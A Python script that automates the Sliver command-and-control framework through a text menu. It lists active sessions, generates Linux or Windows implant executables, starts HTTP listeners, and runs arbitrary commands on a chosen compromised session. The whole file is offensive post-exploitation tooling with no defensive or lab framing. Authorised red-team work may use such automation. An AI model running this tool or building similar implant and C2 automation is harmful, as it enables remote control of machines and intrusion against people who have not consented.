#!/usr/bin/env python3

import subprocess
import json
import time
import sys
import os

class SliverAutomation:
    def __init__(self):
        self.sliver_client = "sliver-client"
        
    def execute_sliver_command(self, command):
        """Execute a command in Sliver and return the output"""
        try:
            # Create a temporary script file
            script_content = f"""
connect
{command}
exit
"""
            with open('/tmp/sliver_script.txt', 'w') as f:
                f.write(script_content)
            
            # Execute the script
            result = subprocess.run([self.sliver_client, '-c', '/tmp/sliver_script.txt'], 
                                  capture_output=True, text=True, timeout=30)
            
            # Clean up
            os.remove('/tmp/sliver_script.txt')
            
            return result.stdout, result.stderr
            
        except Exception as e:
            return None, str(e)
    
    def list_sessions(self):
        """List all active sessions"""
        print("[+] Listing active sessions...")
        stdout, stderr = self.execute_sliver_command("sessions")
        if stdout:
            print(stdout)
        if stderr:
            print(f"Error: {stderr}")
    
    def generate_implant(self, os_type="linux", arch="amd64", listener_type="http", port=8080):
        """Generate a new implant"""
        print(f"[+] Generating {os_type} implant...")
        command = f"generate --{listener_type} localhost:{port} --os {os_type} --arch {arch} --format executable --save /tmp/"
        stdout, stderr = self.execute_sliver_command(command)
        if stdout:
            print(stdout)
        if stderr:
            print(f"Error: {stderr}")
    
    def start_listener(self, listener_type="http", port=8080):
        """Start a listener"""
        print(f"[+] Starting {listener_type} listener on port {port}...")
        command = f"{listener_type} --lport {port}"
        stdout, stderr = self.execute_sliver_command(command)
        if stdout:
            print(stdout)
        if stderr:
            print(f"Error: {stderr}")
    
    def execute_on_session(self, session_id, command):
        """Execute a command on a specific session"""
        print(f"[+] Executing '{command}' on session {session_id}...")
        sliver_command = f"use {session_id}\n{command}"
        stdout, stderr = self.execute_sliver_command(sliver_command)
        if stdout:
            print(stdout)
        if stderr:
            print(f"Error: {stderr}")

def main():
    automation = SliverAutomation()
    
    print("=== Sliver C2 Automation Script ===")
    print("1. List Sessions")
    print("2. Generate Implant")
    print("3. Start HTTP Listener")
    print("4. Execute Command on Session")
    print("5. Exit")
    
    while True:
        choice = input("\nEnter your choice (1-5): ").strip()
        
        if choice == "1":
            automation.list_sessions()
            
        elif choice == "2":
            os_type = input("Enter OS type (linux/windows) [linux]: ").strip() or "linux"
            automation.generate_implant(os_type=os_type)
            
        elif choice == "3":
            port = input("Enter port number [8080]: ").strip() or "8080"
            automation.start_listener(port=int(port))
            
        elif choice == "4":
            session_id = input("Enter session ID: ").strip()
            command = input("Enter command to execute: ").strip()
            if session_id and command:
                automation.execute_on_session(session_id, command)
            else:
                print("Session ID and command are required!")
                
        elif choice == "5":
            print("Exiting...")
            break
            
        else:
            print("Invalid choice! Please enter 1-5.")

if __name__ == "__main__":
    main()
